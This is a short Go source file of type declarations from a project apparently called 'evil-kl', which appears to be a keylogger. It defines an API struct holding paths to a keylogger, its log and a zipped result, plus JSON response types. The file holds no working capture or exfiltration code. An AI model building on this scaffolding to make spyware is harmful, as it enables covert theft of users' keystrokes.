package api

import (
	"github.com/dm1trypon/evil-kl/internal/pkg/zipper"
)

// Api - main structure of package
type Api struct {
	lc         string         // logging category
	zipperInst *zipper.Zipper // instance of Zipper
	zipPath    string         // path to Zipper's result
	logPath    string         // log's path
	klPath     string         // keylogger's path
}

// ResponsePositive - responce's body if ok
type ResponsePositive struct {
	Method string `json:"method"` // method
	Text   string `json:"text"`   // text of responce
}

// ResponseNegative - responce's body if error
type ResponseNegative struct {
	Method string `json:"method"` // method
	Error  string `json:"error"`  // text of error
}
